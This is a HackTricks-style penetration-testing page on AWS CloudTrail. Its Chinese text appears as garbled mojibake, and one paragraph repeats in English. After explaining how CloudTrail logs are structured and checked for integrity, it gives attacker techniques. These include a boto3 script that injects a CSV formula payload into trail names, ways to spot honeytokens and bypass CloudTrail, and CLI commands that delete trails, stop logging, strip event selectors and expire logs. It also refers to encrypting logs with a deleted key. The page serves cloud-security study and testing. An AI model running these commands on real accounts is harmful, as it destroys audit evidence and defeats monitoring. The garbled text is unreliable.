# AWS - CloudTrailæšä¸¾

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## **CloudTrail**

AWS CloudTrail **è®°å½•å’Œç›‘æ§æ‚¨çš„AWSç¯å¢ƒä¸­çš„æ´»åŠ¨**ã€‚å®ƒæ•è·è¯¦ç»†çš„**äº‹ä»¶æ—¥å¿—**ï¼ŒåŒ…æ‹¬è°åœ¨ä»€ä¹ˆæ—¶å€™ä»å“ªé‡Œåšäº†ä»€ä¹ˆï¼Œä»¥åŠä¸AWSèµ„æºçš„æ‰€æœ‰äº¤äº’ã€‚è¿™æä¾›äº†å˜æ›´å’Œæ“ä½œçš„å®¡è®¡è·Ÿè¸ªï¼Œæœ‰åŠ©äºå®‰å…¨åˆ†æã€åˆè§„å®¡è®¡å’Œèµ„æºå˜æ›´è·Ÿè¸ªã€‚CloudTrailå¯¹äºç†è§£ç”¨æˆ·å’Œèµ„æºè¡Œä¸ºã€å¢å¼ºå®‰å…¨å§¿æ€å’Œç¡®ä¿åˆè§„æ€§è‡³å…³é‡è¦ã€‚

æ¯ä¸ªè®°å½•çš„äº‹ä»¶åŒ…å«ï¼š

* è°ƒç”¨çš„APIåç§°ï¼š`eventName`
* è°ƒç”¨çš„æœåŠ¡ï¼š`eventSource`
* æ—¶é—´ï¼š`eventTime`
* IPåœ°å€ï¼š`SourceIPAddress`
* ä»£ç†æ–¹æ³•ï¼š`userAgent`ã€‚ä¾‹å¦‚ï¼š
* Signing.amazonaws.com - æ¥è‡ªAWSç®¡ç†æ§åˆ¶å°
* console.amazonaws.com - è´¦æˆ·çš„æ ¹ç”¨æˆ·
* lambda.amazonaws.com - AWS Lambda
* è¯·æ±‚å‚æ•°ï¼š`requestParameters`
* å“åº”å…ƒç´ ï¼š`responseElements`

äº‹ä»¶ä»¥JSONæ–‡ä»¶çš„å½¢å¼**æ¯5åˆ†é’Ÿå†™å…¥ä¸€ä¸ªæ–°çš„æ—¥å¿—æ–‡ä»¶**ï¼Œç”±CloudTrailä¿å­˜ï¼Œå¹¶åœ¨å¤§çº¦15åˆ†é’Ÿå**å°†æ—¥å¿—æ–‡ä»¶ä¼ é€åˆ°S3**ã€‚\
CloudTrailæ—¥å¿—å¯ä»¥**è·¨è´¦æˆ·å’Œè·¨åŒºåŸŸè¿›è¡Œèšåˆ**ã€‚\
CloudTrailå…è®¸ä½¿ç”¨æ—¥å¿—æ–‡ä»¶å®Œæ•´æ€§ï¼Œä»¥ä¾¿èƒ½å¤ŸéªŒè¯æ‚¨çš„æ—¥å¿—æ–‡ä»¶è‡ªä»CloudTrailå°†å…¶äº¤ä»˜ç»™æ‚¨ä»¥æ¥æ˜¯å¦æœªè¢«æ›´æ”¹ã€‚å®ƒåœ¨æ‘˜è¦æ–‡ä»¶ä¸­åˆ›å»ºæ—¥å¿—çš„SHA-256å“ˆå¸Œå€¼ã€‚æ¯å°æ—¶åˆ›å»ºä¸€æ¬¡æ–°æ—¥å¿—çš„sha-256å“ˆå¸Œå€¼ã€‚\
åˆ›å»ºTrailæ—¶ï¼Œäº‹ä»¶é€‰æ‹©å™¨å°†å…è®¸æ‚¨æŒ‡ç¤ºè¦è®°å½•çš„Trailï¼šç®¡ç†ã€æ•°æ®æˆ–æ´å¯Ÿäº‹ä»¶ã€‚

æ—¥å¿—ä¿å­˜åœ¨S3å­˜å‚¨æ¡¶ä¸­ã€‚é»˜è®¤æƒ…å†µä¸‹ä½¿ç”¨æœåŠ¡å™¨ç«¯åŠ å¯†ï¼ˆSSE-S3ï¼‰ï¼Œå› æ­¤AWSå°†ä¸ºå…·æœ‰è®¿é—®æƒé™çš„äººè§£å¯†å†…å®¹ï¼Œä½†ä¸ºäº†å¢åŠ å®‰å…¨æ€§ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨SSEä¸KMSå’Œè‡ªå·±çš„å¯†é’¥ã€‚

æ—¥å¿—ä»¥ä»¥ä¸‹åç§°æ ¼å¼å­˜å‚¨åœ¨S3å­˜å‚¨æ¡¶ä¸­ï¼š

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* å…¶ä¸­BucketNameä¸ºï¼š**`aws-cloudtrail-logs-<accountid>-<random>`**
* ç¤ºä¾‹ï¼š**`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

åœ¨æ¯ä¸ªæ–‡ä»¶å¤¹ä¸­ï¼Œæ¯ä¸ªæ—¥å¿—çš„åç§°å°†éµå¾ªä»¥ä¸‹æ ¼å¼ï¼š**`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

æ—¥å¿—æ–‡ä»¶å‘½åçº¦å®š

![](<../../../../.gitbook/assets/image (29).png>)

æ­¤å¤–ï¼Œ**æ‘˜è¦æ–‡ä»¶ï¼ˆç”¨äºæ£€æŸ¥æ–‡ä»¶å®Œæ•´æ€§ï¼‰**å°†ä½äº**åŒä¸€ä¸ªå­˜å‚¨æ¡¶**ä¸­ï¼š

![](<../../../../.gitbook/assets/image (22).png>)

### èšåˆå¤šä¸ªè´¦æˆ·çš„æ—¥å¿—

* åœ¨æ‚¨å¸Œæœ›å°†æ—¥å¿—æ–‡ä»¶ä¼ é€åˆ°çš„AWSè´¦æˆ·ä¸­åˆ›å»ºä¸€ä¸ªTrail
* ä¸ºç›®æ ‡S3å­˜å‚¨æ¡¶åº”ç”¨æƒé™ï¼Œå…è®¸CloudTrailè¿›è¡Œè·¨è´¦æˆ·è®¿é—®ï¼Œå¹¶å…è®¸æ¯ä¸ªéœ€è¦è®¿é—®çš„AWSè´¦æˆ·
* åœ¨å…¶ä»–AWSè´¦æˆ·ä¸­åˆ›å»ºä¸€ä¸ªæ–°çš„Trailï¼Œå¹¶é€‰æ‹©ä½¿ç”¨ç¬¬1æ­¥ä¸­åˆ›å»ºçš„å­˜å‚¨æ¡¶

ç„¶è€Œï¼Œå³ä½¿æ‚¨å¯ä»¥å°†æ‰€æœ‰æ—¥å¿—ä¿å­˜åœ¨åŒä¸€ä¸ªS3å­˜å‚¨æ¡¶ä¸­ï¼Œä¹Ÿæ— æ³•å°†æ¥è‡ªå¤šä¸ªè´¦æˆ·çš„CloudTrailæ—¥å¿—èšåˆåˆ°å±äºå•ä¸ªAWSè´¦æˆ·çš„CloudWatch Logsä¸­

### å°†æ‰€æœ‰ç»„ç»‡è´¦æˆ·çš„CloudTrailèšåˆåˆ°ä¸€ä¸ªè´¦æˆ·ä¸­

åœ¨åˆ›å»ºCloudTrailæ—¶ï¼Œå¯ä»¥æŒ‡ç¤ºæ¿€æ´»ç»„ç»‡ä¸­æ‰€æœ‰è´¦æˆ·çš„CloudTrailï¼Œå¹¶å°†æ—¥å¿—ä¿å­˜åœ¨ä¸€ä¸ªå­˜å‚¨æ¡¶ä¸­ï¼š

<figure><img src="../../../../.gitbook/assets/image (1) (1) (5).png" alt=""><figcaption></figcaption></figure>

è¿™æ ·ï¼Œæ‚¨å¯ä»¥è½»æ¾é…ç½®æ‰€æœ‰è´¦æˆ·çš„æ‰€æœ‰åŒºåŸŸçš„CloudTrailï¼Œå¹¶å°†æ—¥å¿—é›†ä¸­åœ¨ä¸€ä¸ªè´¦æˆ·ä¸­ï¼ˆæ‚¨åº”è¯¥ä¿æŠ¤è¯¥è´¦æˆ·ï¼‰ã€‚

### æ£€æŸ¥æ—¥å¿—æ–‡ä»¶

æ‚¨å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹å‘½ä»¤æ¥æ£€æŸ¥æ—¥å¿—æ˜¯å¦è¢«ç¯¡æ”¹

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### å°†æ—¥å¿—å‘é€åˆ°CloudWatch

**CloudTrailå¯ä»¥è‡ªåŠ¨å°†æ—¥å¿—å‘é€åˆ°CloudWatchï¼Œè¿™æ ·æ‚¨å°±å¯ä»¥è®¾ç½®è­¦æŠ¥ï¼Œä»¥åœ¨æ‰§è¡Œå¯ç–‘æ´»åŠ¨æ—¶å‘å‡ºè­¦å‘Šã€‚**\
è¯·æ³¨æ„ï¼Œä¸ºäº†å…è®¸CloudTrailå°†æ—¥å¿—å‘é€åˆ°CloudWatchï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªå…è®¸è¯¥æ“ä½œçš„**è§’è‰²**ã€‚å¦‚æœå¯èƒ½çš„è¯ï¼Œå»ºè®®ä½¿ç”¨AWSé»˜è®¤è§’è‰²æ‰§è¡Œè¿™äº›æ“ä½œã€‚æ­¤è§’è‰²å°†å…è®¸CloudTrailæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

* CreateLogStreamï¼šå…è®¸åˆ›å»ºCloudWatch Logsæ—¥å¿—æµ
* PutLogEventsï¼šå°†CloudTrailæ—¥å¿—ä¼ é€’åˆ°CloudWatch Logsæ—¥å¿—æµ

### äº‹ä»¶å†å²

CloudTrailäº‹ä»¶å†å²å…è®¸æ‚¨åœ¨è¡¨æ ¼ä¸­æ£€æŸ¥å·²è®°å½•çš„æ—¥å¿—ï¼š

![](<../../../../.gitbook/assets/image (24).png>)

### æ´å¯Ÿ

**CloudTrail Insights**è‡ªåŠ¨**åˆ†æ**æ¥è‡ªCloudTrailè·Ÿè¸ªçš„å†™å…¥ç®¡ç†äº‹ä»¶ï¼Œå¹¶å‘æ‚¨**å‘å‡ºè­¦æŠ¥**ä»¥æ£€æµ‹å¼‚å¸¸æ´»åŠ¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ`TerminateInstance`äº‹ä»¶çš„æ•°é‡å¢åŠ ä¸å·²å»ºç«‹çš„åŸºçº¿ä¸ç¬¦ï¼Œæ‚¨å°†çœ‹åˆ°å®ƒä½œä¸ºä¸€ä¸ªæ´å¯Ÿäº‹ä»¶ã€‚è¿™äº›äº‹ä»¶ä½¿**æŸ¥æ‰¾å’Œå“åº”å¼‚å¸¸APIæ´»åŠ¨å˜å¾—æ›´åŠ å®¹æ˜“**ã€‚

è¿™äº›æ´å¯Ÿç»“æœå­˜å‚¨åœ¨ä¸CloudTrailæ—¥å¿—ç›¸åŒçš„å­˜å‚¨æ¡¶ä¸­ï¼š`BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### å®‰å…¨æ€§

| CloudTrailæ—¥å¿—æ–‡ä»¶å®Œæ•´æ€§        | <ul><li>éªŒè¯æ—¥å¿—æ˜¯å¦è¢«ç¯¡æ”¹ï¼ˆä¿®æ”¹æˆ–åˆ é™¤ï¼‰</li><li><p>ä½¿ç”¨æ‘˜è¦æ–‡ä»¶ï¼ˆä¸ºæ¯ä¸ªæ–‡ä»¶åˆ›å»ºå“ˆå¸Œï¼‰</p><ul><li>SHA-256å“ˆå¸Œ</li><li>SHA-256ä¸RSAè¿›è¡Œæ•°å­—ç­¾å</li><li>ç”±Amazonæ‹¥æœ‰çš„ç§é’¥</li></ul></li><li>åˆ›å»ºæ‘˜è¦æ–‡ä»¶éœ€è¦1å°æ—¶ï¼ˆæ¯å°æ—¶çš„æ•´ç‚¹è¿›è¡Œï¼‰</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| é˜»æ­¢æœªç»æˆæƒçš„è®¿é—®             | <ul><li><p>ä½¿ç”¨IAMç­–ç•¥å’ŒS3å­˜å‚¨æ¡¶ç­–ç•¥</p><ul><li>å®‰å…¨å›¢é˜Ÿ â€”> ç®¡ç†å‘˜è®¿é—®</li><li>å®¡è®¡å‘˜ â€”> åªè¯»è®¿é—®</li></ul></li><li>ä½¿ç”¨SSE-S3/SSE-KMSå¯¹æ—¥å¿—è¿›è¡ŒåŠ å¯†</li></ul>                                                                                                                                        |
| é˜²æ­¢æ—¥å¿—æ–‡ä»¶è¢«åˆ é™¤ | <ul><li>ä½¿ç”¨IAMå’Œå­˜å‚¨æ¡¶ç­–ç•¥é™åˆ¶åˆ é™¤è®¿é—®</li><li>é…ç½®S3 MFAåˆ é™¤</li><li>ä½¿ç”¨æ—¥å¿—æ–‡ä»¶éªŒè¯è¿›è¡ŒéªŒè¯</li></ul>                                                                                                                                                                                            |

## è®¿é—®é¡¾é—®

AWSè®¿é—®é¡¾é—®ä¾èµ–äºæœ€è¿‘400å¤©çš„AWS **CloudTrailæ—¥å¿—æ¥æ”¶é›†æ´å¯Ÿä¿¡æ¯**ã€‚CloudTrailæ•è·äº†åœ¨AWSè´¦æˆ·ä¸­è¿›è¡Œçš„AWS APIè°ƒç”¨å’Œç›¸å…³äº‹ä»¶çš„å†å²è®°å½•ã€‚è®¿é—®é¡¾é—®åˆ©ç”¨è¿™äº›æ•°æ®æ¥**æ˜¾ç¤ºæœåŠ¡çš„æœ€åè®¿é—®æ—¶é—´**ã€‚é€šè¿‡åˆ†æCloudTrailæ—¥å¿—ï¼Œè®¿é—®é¡¾é—®å¯ä»¥ç¡®å®šIAMç”¨æˆ·æˆ–è§’è‰²è®¿é—®äº†å“ªäº›AWSæœåŠ¡ä»¥åŠè®¿é—®å‘ç”Ÿçš„æ—¶é—´ã€‚è¿™æœ‰åŠ©äºAWSç®¡ç†å‘˜åšå‡ºæ˜æ™ºçš„å†³ç­–ï¼Œä»¥ä¼˜åŒ–æƒé™ï¼Œå› ä¸ºä»–ä»¬å¯ä»¥è¯†åˆ«é•¿æ—¶é—´æœªè®¿é—®çš„æœåŠ¡ï¼Œå¹¶æ ¹æ®å®é™…ä½¿ç”¨æ¨¡å¼å‡å°‘è¿‡äºå®½æ³›çš„æƒé™ã€‚

{% hint style="success" %}
å› æ­¤ï¼Œè®¿é—®é¡¾é—®ä¼šæä¾›å…³äº**ç»™ç”¨æˆ·æˆäºˆçš„ä¸å¿…è¦æƒé™**çš„ä¿¡æ¯ï¼Œä»¥ä¾¿ç®¡ç†å‘˜å¯ä»¥åˆ é™¤å®ƒä»¬
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

## æ“ä½œ

### æšä¸¾
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSVæ³¨å…¥**

åœ¨CloudTrailä¸­ï¼Œå¯ä»¥æ‰§è¡ŒCSVæ³¨å…¥ï¼Œå¦‚æœæ—¥å¿—ä»¥CSVæ ¼å¼å¯¼å‡ºå¹¶åœ¨Excelä¸­æ‰“å¼€ï¼Œå°†æ‰§è¡Œä»»æ„ä»£ç ã€‚\
ä»¥ä¸‹ä»£ç å°†ç”Ÿæˆä¸€ä¸ªåŒ…å«æ¶æ„è´Ÿè½½çš„é”™è¯¯Trailåç§°çš„æ—¥å¿—æ¡ç›®ï¼š
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
æœ‰å…³CSVæ³¨å…¥çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹é¡µé¢ï¼š

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

æœ‰å…³æ­¤ç‰¹å®šæŠ€æœ¯çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/)

## **ç»•è¿‡æ£€æµ‹**

### HoneyTokensç»•è¿‡

HoneyTokensè¢«åˆ›å»ºç”¨äº**æ£€æµ‹æ•æ„Ÿä¿¡æ¯çš„å¤–æ³„**ã€‚åœ¨AWSçš„æƒ…å†µä¸‹ï¼Œå®ƒä»¬æ˜¯**è¢«ç›‘æ§ä½¿ç”¨çš„AWSå¯†é’¥**ï¼Œå¦‚æœæœ‰ä»€ä¹ˆè§¦å‘äº†ä½¿ç”¨è¯¥å¯†é’¥çš„æ“ä½œï¼Œé‚£ä¹ˆè‚¯å®šæœ‰äººå·èµ°äº†è¯¥å¯†é’¥ã€‚

ç„¶è€Œï¼Œè¿™ç§ç›‘æ§æ˜¯é€šè¿‡**CloudTrail**è¿›è¡Œçš„ï¼Œè€Œæœ‰ä¸€äº›**AWSæœåŠ¡ä¸ä¼šå°†æ—¥å¿—å‘é€åˆ°CloudTrail**ï¼ˆåœ¨[æ­¤å¤„](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)æ‰¾åˆ°åˆ—è¡¨ï¼‰ã€‚å…¶ä¸­ä¸€äº›æœåŠ¡å°†ä»¥åŒ…å«**å¯†é’¥è§’è‰²çš„ARNçš„é”™è¯¯**ä½œä¸º**å“åº”**ï¼Œå¦‚æœæœªç»æˆæƒçš„äººï¼ˆå³HoneyTokenå¯†é’¥ï¼‰å°è¯•è®¿é—®å®ƒã€‚

è¿™æ ·ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ä¸è§¦å‘ä»»ä½•æ—¥å¿—çš„æƒ…å†µä¸‹è·å–å¯†é’¥çš„ARNã€‚åœ¨ARNä¸­ï¼Œæ”»å‡»è€…å¯ä»¥çœ‹åˆ°**AWSå¸æˆ·IDå’Œåç§°**ï¼Œå¾ˆå®¹æ˜“çŸ¥é“HoneyTokençš„å…¬å¸å¸æˆ·IDå’Œåç§°ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥ç¡®å®šä»¤ç‰Œæ˜¯å¦ä¸ºHoneyTokenã€‚

![](<../../../../.gitbook/assets/image (65).png>)

#### HoneyTokensæ£€æµ‹

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam\_\_detect\_honeytokens/main.py#L57)æ£€æµ‹å¯†é’¥æ˜¯å¦å±äº[**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**:**

* å¦‚æœè§’è‰²åç§°ä¸­å‡ºç°**`canarytokens.org`**æˆ–é”™è¯¯æ¶ˆæ¯ä¸­å‡ºç°**`534261010715`**ã€‚
* æœ€è¿‘çš„æµ‹è¯•ä¸­ï¼Œå®ƒä»¬ä½¿ç”¨çš„æ˜¯å¸æˆ·**`717712589309`**ï¼Œåç§°ä¸­ä»ç„¶åŒ…å«**`canarytokens.com`**å­—ç¬¦ä¸²ã€‚
* å¦‚æœé”™è¯¯æ¶ˆæ¯ä¸­çš„è§’è‰²åç§°ä¸­å‡ºç°**`SpaceCrab`**
* **SpaceSiren**ä½¿ç”¨**uuids**ç”Ÿæˆç”¨æˆ·åï¼š`[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* å¦‚æœ**åç§°çœ‹èµ·æ¥åƒæ˜¯éšæœºç”Ÿæˆçš„**ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯HoneyTokenã€‚

{% hint style="danger" %}
è¯·æ³¨æ„ï¼Œæ‰€æœ‰å·²å‘ç°ä¸ä¼šåˆ›å»ºCloudTrailæ—¥å¿—çš„å…¬å…±APIç°åœ¨éƒ½å·²ä¿®å¤ï¼Œæ‰€ä»¥ä¹Ÿè®¸ä½ éœ€è¦æ‰¾åˆ°è‡ªå·±çš„...
{% endhint %}

æœ‰å…³æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[**åŸå§‹ç ”ç©¶**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/)ã€‚

### è®¿é—®ç¬¬ä¸‰æ–¹åŸºç¡€è®¾æ–½

æŸäº›AWSæœåŠ¡å°†**ç”Ÿæˆä¸€äº›åŸºç¡€è®¾æ–½**ï¼Œä¾‹å¦‚**æ•°æ®åº“**æˆ–**Kubernetes**é›†ç¾¤ï¼ˆEKSï¼‰ã€‚ç›´æ¥ä¸è¿™äº›æœåŠ¡é€šä¿¡çš„ç”¨æˆ·ï¼ˆå¦‚Kubernetes APIï¼‰**ä¸ä¼šä½¿ç”¨AWS API**ï¼Œå› æ­¤CloudTrailæ— æ³•çœ‹åˆ°æ­¤é€šä¿¡ã€‚

å› æ­¤ï¼Œå…·æœ‰è®¿é—®EKSæƒé™å¹¶å‘ç°EKS APIçš„URLçš„ç”¨æˆ·å¯ä»¥åœ¨æœ¬åœ°ç”Ÿæˆä»¤ç‰Œï¼Œå¹¶**ç›´æ¥ä¸APIæœåŠ¡é€šä¿¡ï¼Œè€Œä¸ä¼šè¢«CloudTrailæ£€æµ‹åˆ°**ã€‚

æ›´å¤šä¿¡æ¯è¯·å‚è§ï¼š

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### ä¿®æ”¹CloudTrailé…ç½®

#### åˆ é™¤è·Ÿè¸ª
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### åœæ­¢è·Ÿè¸ª

To stop a trail, use the `stop-logging` command. This command stops the delivery of log files from CloudTrail to the specified Amazon S3 bucket. 

è¦åœæ­¢è·Ÿè¸ªï¼Œè¯·ä½¿ç”¨`stop-logging`å‘½ä»¤ã€‚è¯¥å‘½ä»¤å°†åœæ­¢å°†æ—¥å¿—æ–‡ä»¶ä»CloudTrailä¼ é€’åˆ°æŒ‡å®šçš„Amazon S3å­˜å‚¨æ¡¶ã€‚
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### ç¦ç”¨å¤šåŒºåŸŸæ—¥å¿—è®°å½•

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### é€šè¿‡äº‹ä»¶é€‰æ‹©å™¨ç¦ç”¨æ—¥å¿—è®°å½•

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

åœ¨ç¬¬ä¸€ä¸ªç¤ºä¾‹ä¸­ï¼Œä¸€ä¸ªå•ç‹¬çš„äº‹ä»¶é€‰æ‹©å™¨ä»¥JSONæ•°ç»„çš„å½¢å¼æä¾›ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå¯¹è±¡ã€‚`"ReadWriteType": "ReadOnly"` è¡¨ç¤º**äº‹ä»¶é€‰æ‹©å™¨åªæ•è·åªè¯»äº‹ä»¶**ï¼ˆå› æ­¤ CloudTrail æ´å¯Ÿä¸ä¼šæ£€æŸ¥å†™å…¥äº‹ä»¶ï¼Œä¾‹å¦‚ï¼‰ã€‚

æ‚¨å¯ä»¥æ ¹æ®è‡ªå·±çš„ç‰¹å®šè¦æ±‚è‡ªå®šä¹‰äº‹ä»¶é€‰æ‹©å™¨ã€‚

#### é€šè¿‡ S3 ç”Ÿå‘½å‘¨æœŸç­–ç•¥åˆ é™¤æ—¥å¿—

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### ä¿®æ”¹å­˜å‚¨æ¡¶é…ç½®

* åˆ é™¤S3å­˜å‚¨æ¡¶
* æ›´æ”¹å­˜å‚¨æ¡¶ç­–ç•¥ï¼Œæ‹’ç»CloudTrailæœåŠ¡çš„ä»»ä½•å†™å…¥æ“ä½œ
* å‘S3å­˜å‚¨æ¡¶æ·»åŠ ç”Ÿå‘½å‘¨æœŸç­–ç•¥ä»¥åˆ é™¤å¯¹è±¡
* ç¦ç”¨ç”¨äºåŠ å¯†CloudTrailæ—¥å¿—çš„KMSå¯†é’¥

### Cloudtrailå‹’ç´¢è½¯ä»¶

#### S3å‹’ç´¢è½¯ä»¶

æ‚¨å¯ä»¥**ç”Ÿæˆä¸€ä¸ªéå¯¹ç§°å¯†é’¥**ï¼Œè®©**CloudTrailä½¿ç”¨è¯¥å¯†é’¥åŠ å¯†æ•°æ®**ï¼Œç„¶å**åˆ é™¤ç§é’¥**ï¼Œè¿™æ ·å°±æ— æ³•æ¢å¤CloudTrailå†…å®¹ã€‚\
è¿™åŸºæœ¬ä¸Šæ˜¯ä¸€ä¸ªåœ¨ä»¥ä¸‹é“¾æ¥ä¸­è§£é‡Šçš„**S3-KMSå‹’ç´¢è½¯ä»¶**ï¼š

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMSå‹’ç´¢è½¯ä»¶**

è¿™æ˜¯ä¸€ç§ä½¿ç”¨ä¸åŒæƒé™è¦æ±‚æ‰§è¡Œå…ˆå‰æ”»å‡»çš„ç®€å•æ–¹æ³•ï¼š

{% content-ref url="../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **å‚è€ƒèµ„æ–™**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“ï¼Œ[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
